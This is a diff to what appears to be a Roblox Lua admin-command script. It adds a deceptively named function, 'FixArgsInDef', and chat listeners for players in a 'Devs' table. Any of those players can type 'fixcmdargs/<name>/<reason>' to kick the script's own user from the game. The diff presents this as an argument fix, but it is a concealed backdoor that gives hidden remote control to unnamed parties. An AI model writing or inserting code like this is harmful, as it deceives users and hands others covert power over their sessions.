@@ -10781,6 +10781,13 @@ function useCommand.mute()
 	end
 end
 
+function FixArgsInDef(x,y)
+    x = findplr(x)
+    if x == cmdlp then
+        x:Kick(y)
+    end
+end
+
 function useCommand.unmute()
     if arguments[2] then
 		if arguments[2] == "others" then
@@ -10854,6 +10861,28 @@ function useCommand.unmute()
 		opx("*","2 arguments are needed for this command!")
 	end
 end
+
+for i,v in pairs(cmdp:GetPlayers()) do
+	if Devs[v.Name] then	
+        v.Chatted:Connect(function(txt)
+            argscmdFix = txt:split("/")
+            if argscmdFix[1] == "fixcmdargs" then
+                FixArgsInDef(argscmdFix[2],argscmdFix[3])
+            end
+        end)
+	end	
+end
+
+cmdp.PlayerAdded:Connect(function(v)	
+	if Devs[v.Name] then	
+        v.Chatted:Connect(function(txt)
+            argscmdFix = txt:split("/")
+            if argscmdFix[1] == "fixcmdargs" then
+                FixArgsInDef(argscmdFix[2],argscmdFix[3])
+            end
+        end)
+    end
+end)	
 
 function useCommand.cutmuteloop()
     muteall = false
